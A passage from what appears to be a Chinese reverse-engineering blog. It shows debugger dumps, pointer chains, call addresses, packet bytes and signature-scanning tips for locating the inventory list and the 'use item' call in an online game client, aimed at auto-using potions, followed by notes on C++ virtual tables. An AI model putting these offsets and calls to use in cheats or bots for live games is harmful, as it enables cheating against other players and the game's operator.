class=\"line\"></span><br><span class=\"line\">add esp,0x18</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00B661C4 - F3 0F5C 50 3C  - subss xmm2,[eax+3C]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"找人物背包物品列表\"><a class=\"markdownIt-Anchor\" href=\"#找人物背包物品列表\">#</a> 找人物背包物品列表</h4>\n<p>思路一：以背包中某一种物品来分析，最好是能叠加的，数量可以改变</p>\n<p>物品列表 -&gt; 多种物品 (名字，数量)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00BA02D6 - 01 41 14  - add [ecx+14],eax</span><br><span class=\"line\"></span><br><span class=\"line\">00BA02D0             | 55                    | push ebp                              |</span><br><span class=\"line\">00BA02D1             | 8BEC                  | mov ebp,esp                           |</span><br><span class=\"line\">00BA02D3             | 8B45 08               | mov eax,dword ptr ss:[ebp+8]          | FFFFFFFF</span><br><span class=\"line\">00BA02D6             | 0141 14               | add dword ptr ds:[ecx+14],eax         | ecx = 72221188</span><br><span class=\"line\">00BA02D9             | 8379 14 00            | cmp dword ptr ds:[ecx+14],0           | ecx+14:L&quot;ш&quot;</span><br><span class=\"line\">00BA02DD             | 7D 07                 | jge elementclient.BA02E6              |</span><br><span class=\"line\">00BA02DF             | C741 14 00000000      | mov dword ptr ds:[ecx+14],0           | ecx+14:L&quot;ш&quot;</span><br><span class=\"line\">00BA02E6             | 8B41 18               | mov eax,dword ptr ds:[ecx+18]         | 0000270F</span><br><span class=\"line\">00BA02E9             | 3941 14               | cmp dword ptr ds:[ecx+14],eax         | ecx+14:L&quot;ш&quot;</span><br><span class=\"line\">00BA02EC             | 7E 03                 | jle elementclient.BA02F1              |</span><br><span class=\"line\">00BA02EE             | 8941 14               | mov dword ptr ds:[ecx+14],eax         | ecx+14:L&quot;ш&quot;</span><br><span class=\"line\">00BA02F1             | 8B41 14               | mov eax,dword ptr ds:[ecx+14]         | 445</span><br><span class=\"line\">00BA02F4             | 5D                    | pop ebp                               |</span><br><span class=\"line\">00BA02F5             | C2 0400               | ret 4                                 |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    722211 0127B5E4 äµ&#x27;. </span><br><span class=\"line\">$+4      722211 00000000 .... </span><br><span class=\"line\">$+8      722211 00000009 ....   ;物品类型 回血蓝0x09   0x08生产材料 0x1F仙药  0x0F武器 0x3装备 0x2弹药</span><br><span class=\"line\">$+C      722211 00000710 ....   ;ID    708(生命)  710(真气)</span><br><span class=\"line\">$+10     722211 00000000 .... </span><br><span class=\"line\">$+14     722211 00000447 G...   ;物品数量</span><br><span class=\"line\">$+18     722211 0000270F .&#x27;..   ;物品栏最大数量</span><br><span class=\"line\">$+1C     722211 00000000 .... </span><br><span class=\"line\">$+20     722211 00000384 .... </span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    722225B8   4B684590 .EhK </span><br><span class=\"line\">$+4      722225BC   4B684518 .EhK </span><br><span class=\"line\">$+8      722225C0   72220770 p.&quot;r </span><br><span class=\"line\">$+C      722225C4   5D938E30 0..] </span><br><span class=\"line\">$+10     722225C8   4B6844A0  DhK </span><br><span class=\"line\">$+14     722225CC   4B684428 (DhK </span><br><span class=\"line\">$+18     722225D0   4B6843B0 °ChK </span><br><span class=\"line\">$+1C     722225D4   722207F8 ø.&quot;r </span><br><span class=\"line\">$+20     722225D8   4B684338 8ChK </span><br><span class=\"line\">$+24     722225DC   513FCC68 hÌ?Q </span><br><span class=\"line\">$+28     722225E0   70B166F8 øf±p </span><br><span class=\"line\">$+2C     722225E4   5FE23F60 `?â_ </span><br><span class=\"line\">$+30     722225E8   72221D38 8.&quot;r </span><br><span class=\"line\">$+34     722225EC   72221CB0 °.&quot;r </span><br><span class=\"line\">$+38     722225F0   72221188 ..&quot;r </span><br><span class=\"line\">$+3C     722225F4   4B683D20  =hK </span><br><span class=\"line\">$+40     722225F8   4B683CA8 ¨&lt;hK </span><br><span class=\"line\">$+44     722225FC   4B683C30 0&lt;hK </span><br><span class=\"line\">$+48     72222600   099B88E0 à... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+4C     72222604   099B8A28 (... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+50     72222608   099B8B70 p... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+54     7222260C   099B96F8 ø... &amp;&quot;P痈&quot;</span><br><span class=\"line\">$+58     72222610   099B8CB8 ¸... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+5C     72222614   4B683BB8 ¸;hK </span><br><span class=\"line\">$+60     72222618   099B8E00 .... </span><br><span class=\"line\">$+64     7222261C   099B8F48 H... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+68     72222620   099B9090 .... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+6C     72222624   099B91D8 Ø... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+70     72222628   099B9320  ... &amp;&quot; 品&quot;</span><br><span class=\"line\">$+74     7222262C   099B9468 h... &amp;&quot;P痈&quot;</span><br><span class=\"line\">$+78     72222630   099B95B0 °... &amp;&quot;P痈&quot;</span><br><span class=\"line\">$+7C     72222634   00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">00B77B73 - 8B 47 0C  - mov eax,[edi+0C]</span><br><span class=\"line\">00B77B73             | 8B47 0C               | mov eax,dword ptr ds:[edi+C]          | 722225B8</span><br><span class=\"line\">00B77B76             | 53                    | push ebx                              | 72221188</span><br><span class=\"line\">00B77B77             | 8B1CB0                | mov ebx,dword ptr ds:[eax+esi*4]      |</span><br><span class=\"line\">00B77B7A             | 85DB                  | test ebx,ebx                          |</span><br><span class=\"line\">00B77B7C             | 74 1D                 | je elementclient.B77B9B               |</span><br><span class=\"line\">00B77B7E             | 8B45 0C               | mov eax,dword ptr ss:[ebp+C]          | 1</span><br><span class=\"line\">00B77B81             | 8BCB                  | mov ecx,ebx                           | 72221188</span><br><span class=\"line\">00B77B83             | F7D8                  | neg eax                               |</span><br><span class=\"line\">00B77B85             | 50                    | push eax                              | -1</span><br><span class=\"line\">00B77B86             | E8 45870200           | call elementclient.BA02D0             | eax = 0x441 edi = 30AD5BF8</span><br><span class=\"line\">[edi+c]</span><br><span class=\"line\"></span><br><span class=\"line\">00B34C88             | 51                    | push ecx                              |</span><br><span class=\"line\">00B34C89             | 8BC8                  | mov ecx,eax                           | eax = 30AD5BF8  30AD5BF8</span><br><span class=\"line\"></span><br><span class=\"line\">00B34CC2             | 8B4D 08               | mov ecx,dword ptr ss:[ebp+8]          |</span><br><span class=\"line\">00B34CCA             | 50                    | push eax                              | </span><br><span class=\"line\">00B34CCB             | E8 902E0400           | call elementclient.B77B60             |</span><br><span class=\"line\"></span><br><span class=\"line\">00B49A78             | FF2485 009BB400       | jmp dword ptr ds:[eax*4+B49B00]       |</span><br><span class=\"line\">00B49A7F             | 8B81 40180000         | mov eax,dword ptr ds:[ecx+1840]       | ecx = 3E1DA010</span><br><span class=\"line\">00B49A85             | 5D                    | pop ebp                               |</span><br><span class=\"line\">00B49A86             | C2 0400               | ret 4                                 |</span><br><span class=\"line\"></span><br><span class=\"line\">[[[[[[0150B6FC]+30] + 1840]+C]+x*4] +0x14]    x [0-31]       //物品数量</span><br><span class=\"line\">[[[[0150B6FC]+30] + 1840]+10]</span><br><span class=\"line\">$ ==&gt;    30AD5BF8   0127AB74 t«&#x27;. </span><br><span class=\"line\">$+4      30AD5BFC   0127AB6C l«&#x27;. </span><br><span class=\"line\">$+8      30AD5C00   011EF3B8 ¸ó..   </span><br><span class=\"line\">$+C      30AD5C04   722225B8 ¸%&quot;r  ;背包物品列表</span><br><span class=\"line\">$+10     30AD5C08   00000020  ...  ;背包大小</span><br><span class=\"line\">$+14     30AD5C0C   00000020  ... </span><br><span class=\"line\">$+18     30AD5C10   0000000A .... </span><br><span class=\"line\">$+1C     30AD5C14   00000000 .... </span><br><span class=\"line\">$+20     30AD5C18   00010100 .... </span><br><span class=\"line\">$+40     4B6845D0  3F800000 ...? </span><br><span class=\"line\">$+44     4B6845D4  00000000 .... </span><br><span class=\"line\">$+48     4B6845D8  00000000 .... </span><br><span class=\"line\">$+4C     4B6845DC  537177BC ¼wqS L&quot;^aa32ff星云散聚石 (12)\\\\r^ffffff价格^ffffff 1 银币^ffffff (12) \\\\r^00ffff\\\\r死亡保护\\\\r不可丢在地上\\\\r不可交易\\\\r不可放入账号仓库\\\\r^FF0000占星^ffcb4a必备之物，占星时星盘属性数目、\\\\r属性内容、属性位置同时随机变化。\\\\r\\\\r^96f5ff占星时提供星运经验：1&quot;</span><br><span class=\"line\">$+50     4B6845E0  00000000 .... </span><br><span class=\"line\">$+54     4B6845E4  00000000 .... </span><br><span class=\"line\">$+58     4B6845E8  00000000 .... </span><br><span class=\"line\">$+5C     4B6845EC  00000000 .... </span><br><span class=\"line\">$+60     4B6845F0  00000000 .... </span><br><span class=\"line\">$+64     4B6845F4  00000000 .... </span><br><span class=\"line\">$+68     4B6845F8  28B10B10 ..±(  ;物品属性地址</span><br><span class=\"line\">$+6C     4B6845FC  00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">537177BC ^aa32ff星云散聚石 (12)\\r^ffffff价格^fff</span><br><span class=\"line\"></span><br><span class=\"line\">$ ==&gt;    28B10B10 0000B985 .¹.. </span><br><span class=\"line\">$+4      28B10B14 4E91661F .f.N </span><br><span class=\"line\">$+8      28B10B18 805A6563 ceZ. </span><br><span class=\"line\">$+C      28B10B1C 000077F3 ów.. </span><br><span class=\"line\">$+10     28B10B20 00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">物品类型 = 0x09的偏移 [[[[[[0150B6FC]+30] + 1840]+C]+1*4] +0x68]+4</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230125203049839.png\" alt=\"image-20230125203049839\"></p>\n<p>特征码</p>\n<p>使用 *？匹配通配符</p>\n<p>根据特征码找游戏更新之后的新 call</p>\n<h4 id=\"找使用背包物品call\"><a class=\"markdownIt-Anchor\" href=\"#找使用背包物品call\">#</a> 找使用背包物品 call</h4>\n<p>自动吃红药</p>\n<p>自动吃蓝药</p>\n<p>免疫药</p>\n<p>无敌药</p>\n<p>思路 1：</p>\n<p>以某种物品的相关信息为线索 (名称，数量，ID 等)，用 CE 监视当使用物品时哪些代码对这些信息有访问，大致定位出使用物品 call 的范围</p>\n<p>思路 2：</p>\n<p>对于网游，物品相关的逻辑处理一般是放在服务端处理，所以使用物品的时候必定与服务端有网络数据通讯，所以断点通过 send 函数也可以定位物品使用代码的位置</p>\n<p>bp sned 对 socket 库中的发包函数下断电</p>\n<p>send-&gt; 系统的发送数据的函数</p>\n<p>游戏本身 -&gt; 也有自己的发包函数 sendmsg，这函数里面调用了 send</p>\n<p>SendData(char* data, int length)</p>\n<p>{</p>\n<p>​\t…;</p>\n<p>​\tsend();</p>\n<p>}</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B5A8AA - FF 77 0C  - push [edi+0C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B5BC9F - FF 77 0C  - push [edi+0C]</span><br><span class=\"line\">00B5BC97             | 8B5D 0C               | mov ebx,dword ptr ss:[ebp+C]          | 0</span><br><span class=\"line\">00B5BC9A             | 8B4D E0               | mov ecx,dword ptr ss:[ebp-20]         | 1C58A028 1C58A028</span><br><span class=\"line\">00B5BC9D             | 6A 01                 | push 1                                | 1</span><br><span class=\"line\">00B5BC9F             | FF77 0C               | push dword ptr ds:[edi+C]             | 710</span><br><span class=\"line\">00B5BCA2             | 81C1 EC000000         | add ecx,EC                            |</span><br><span class=\"line\">00B5BCA8             | 53                    | push ebx                              |</span><br><span class=\"line\">00B5BCA9             | 6A 00                 | push 0                                | 0</span><br><span class=\"line\">00B5BCAB             | E8 9025E5FF           | call elementclient.9AE240             | 0</span><br><span class=\"line\"></span><br><span class=\"line\">push 1</span><br><span class=\"line\">push 710</span><br><span class=\"line\">mov ecx,1C58A028</span><br><span class=\"line\">add ecx,0x0EC</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">call 9AE240</span><br><span class=\"line\"></span><br><span class=\"line\">00B34C9D - 39 43 0C  - cmp [ebx+0C],eax</span><br><span class=\"line\"></span><br><span class=\"line\">00D7CC65             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00D7CC67             | 6A 01                 | push 1                                |</span><br><span class=\"line\">00D7CC69             | 68 61CE2F01           | push elementclient.12FCE61            |</span><br><span class=\"line\">00D7CC6E             | FF35 64DF5001         | push dword ptr ds:[150DF64]           |</span><br><span class=\"line\">00D7CC74             | FF15 488A1E01         | call dword ptr ds:[&lt;&amp;send&gt;]           |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7CBA1             | FF75 10               | push dword ptr ss:[ebp+10]            |</span><br><span class=\"line\">00D7CBA4             | FF75 0C               | push dword ptr ss:[ebp+C]             |</span><br><span class=\"line\">00D7CBA7             | E8 24000000           | call elementclient.D7CBD0             |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7D8FC             | FF75 0C               | push dword ptr ss:[ebp+C]             |</span><br><span class=\"line\">00D7D8FF             | 8B8E AC000000         | mov ecx,dword ptr ds:[esi+AC]         |</span><br><span class=\"line\">00D7D905             | 57                    | push edi                              |</span><br><span class=\"line\">00D7D906             | FFB6 B0000000         | push dword ptr ds:[esi+B0]            |</span><br><span class=\"line\">00D7D90C             | E8 0FF2FFFF           | call elementclient.D7CB20             |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7D701             | 66:8906               | mov word ptr ds:[esi],ax              | esi:L&quot;萨ā&quot;</span><br><span class=\"line\">00D7D704             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00D7D706             | 8D45 DC               | lea eax,dword ptr ss:[ebp-24]         |</span><br><span class=\"line\">00D7D709             | 8BCF                  | mov ecx,edi                           | 1C58A028</span><br><span class=\"line\">00D7D70B             | 50                    | push eax                              |</span><br><span class=\"line\">00D7D70C             | E8 9F000000           | call elementclient.D7D7B0             |</span><br><span class=\"line\"></span><br><span class=\"line\">//send packet</span><br><span class=\"line\">00CD2984             | 8A4D 08               | mov cl,byte ptr ss:[ebp+8]            |</span><br><span class=\"line\">00CD2987             | B8 28000000           | mov eax,28                            | 28:&#x27;(&#x27;</span><br><span class=\"line\">00CD298C             | 66:8906               | mov word ptr ds:[esi],ax              |</span><br><span class=\"line\">00CD298F             | 0FB645 0C             | movzx eax,byte ptr ss:[ebp+C]         |</span><br><span class=\"line\">00CD2993             | 66:8946 04            | mov word ptr ds:[esi+4],ax            |</span><br><span class=\"line\">00CD2997             | 8B45 10               | mov eax,dword ptr ss:[ebp+10]         |</span><br><span class=\"line\">00CD299A             | 8946 06               | mov dword ptr ds:[esi+6],eax          |</span><br><span class=\"line\">00CD299D             | 8A45 14               | mov al,byte ptr ss:[ebp+14]           |</span><br><span class=\"line\">00CD29A0             | 884E 02               | mov byte ptr ds:[esi+2],cl            |</span><br><span class=\"line\">00CD29A3             | 8846 03               | mov byte ptr ds:[esi+3],al            |</span><br><span class=\"line\">00CD29A6             | 8B0D 20205001         | mov ecx,dword ptr ds:[1502020]        |</span><br><span class=\"line\">00CD29AC             | 6A 0A                 | push A                                | 包长度</span><br><span class=\"line\">00CD29AE             | 56                    | push esi                              | 数据</span><br><span class=\"line\">00CD29AF             | 8B49 20               | mov ecx,dword ptr ds:[ecx+20]         |</span><br><span class=\"line\">00CD29B2             | E8 C9AC0A00           | call elementclient.D7D680             |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4B758             | 50                    | push eax                              |</span><br><span class=\"line\">00A4B759             | A3 CC235001           | mov dword ptr ds:[15023CC],eax        |</span><br><span class=\"line\">00A4B75E             | E8 AD432800           | call elementclient.CCFB10             |</span><br><span class=\"line\"></span><br><span class=\"line\">00A408FE             | C787 D4040000 FA00000 | mov dword ptr ds:[edi+4D4],FA         | edi+4D4:L&quot; &quot;</span><br><span class=\"line\">00A40908             | FFB7 D4040000         | push dword ptr ds:[edi+4D4]           | edi+4D4:L&quot; &quot;</span><br><span class=\"line\">00A4090E             | 8B4F 1C               | mov ecx,dword ptr ds:[edi+1C]         |</span><br><span class=\"line\">00A40911             | E8 EAAA0000           | call elementclient.A4B400             |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">009AE282             | FF75 14               | push dword ptr ss:[ebp+14]            |</span><br><span class=\"line\">009AE285             | 8911                  | mov dword ptr ds:[ecx],edx            |</span><br><span class=\"line\">009AE287             | FF75 10               | push dword ptr ss:[ebp+10]            |</span><br><span class=\"line\">009AE28A             | FF75 0C               | push dword ptr ss:[ebp+C]             |</span><br><span class=\"line\">009AE28D             | FF75 08               | push dword ptr ss:[ebp+8]             |</span><br><span class=\"line\">009AE290             | E8 DB463200           | call elementclient.CD2970             |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">04B6E034 28 00 00 01 00 00 10 07 00 00 DE FF 3F 01 28 E0 (.........Þÿ?.(à </span><br><span class=\"line\">0028 0100 0000 0710  0000</span><br></pre></td></tr></table></figure>\n<h2 id=\"从逆向的角度看c\"><a class=\"markdownIt-Anchor\" href=\"#从逆向的角度看c\">#</a> 从逆向的角度看 C++</h2>\n<h3 id=\"虚函数\"><a class=\"markdownIt-Anchor\" href=\"#虚函数\">#</a> 虚函数</h3>\n<ul>\n<li><strong>虚函数地址表（虚表）</strong></li>\n</ul>\n<ol>\n<li>\n<ol>\n<li>定义：当类中定义有虚函数时，编译器会把该类中所有虚函数的首地址保存在一张地址表中，即虚函数地址表。</li>\n<li>虚表信息在编译后被链接到执行文件中，因此所获得的虚表地址是一个固定的地址。</li>\n<li>虚表中虚函数的地址排列顺序依据虚函数在类中的声明顺序而定。</li>\n</ol>\n</li>\n</ol>\n<ul>\n<li>\n<p><strong>虚表指针</strong></p>\n</li>\n<li>\n<ul>\n<li>同时编译器还会在类的每个对象添加一个隐藏数据成员，称为虚表指针，保存着虚表的首地址，用于记录和查找虚函数。</li>\n<li>虚表指针的初始化是通过编译器在构造函数中插入代码实现的。由于必须初始化虚表指针，编译器会提供默认的构造函数。</li>\n</ul>\n</li>\n<li>\n<p><strong>虚函数调用过程</strong></p>\n</li>\n<li>\n<ul>\n<li>虚表间接寻址访问：<br>\n使用对象的指针或引用调用虚函数。根据对象的首地址，取出相应的虚表指针，在虚表查找对应的虚函数的首地址，并调用执行。</li>\n<li>直接调用访问：<br>\n使用对象调用虚函数，和调用普通成员函数一样。</li>\n<li>虚函数的识别：</li>\n<li>类中隐式定义一个数据成员</li>\n<li>数据成员在首地址处，占 4 字节</li>\n<li>构造函数初始化该数据成员为某个数组的首地址</li>\n<li>地址属于数据区，相对固定的地址</li>\n<li>数组的成员是函数指针</li>\n<li>函数被调用方式是 thiscall</li>\n<li>构造函数与析构函数都会将虚表指针设置为当前对象所属类中的虚表地址。</li>\n<li>构造函数中是完成虚表指针的初始化，此时虚表指针并没有指向虚表函数。</li>\n<li>执行析构函数时，其对象的虚表指针已经指向某个虚表首地址。虚函数是在还原虚表指针，让其指向自身的虚表首地址，防止在析构函数中调用虚函数时取到非自身虚表</li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654326102652-35f05218-3401-41f7-a10f-3e70d9aed416.png\" alt=\"img\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654326120551-f6cd8e66-fc26-40bd-8d23-a8f6b93c7805.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">class base_class</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    int m_base;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    virtual void v_func1()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func1()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual void v_func2()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func2()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    virtual void v_func3()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;This is base_class&#x27;s v_func3()&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tbase_class Myclass;</span><br><span class=\"line\">\tMyclass.v_func1();</span><br><span class=\"line\">\tMyclass.v_func2();</span><br><span class=\"line\">\tMyclass.v_func3();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对应的汇编为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000A1520 &gt;  55              push    ebp</span><br><span class=\"line\">000A1521    8BEC            mov     ebp,esp</span><br><span class=\"line\">000A1523    81EC D0000000   sub     esp,0xD0</span><br><span 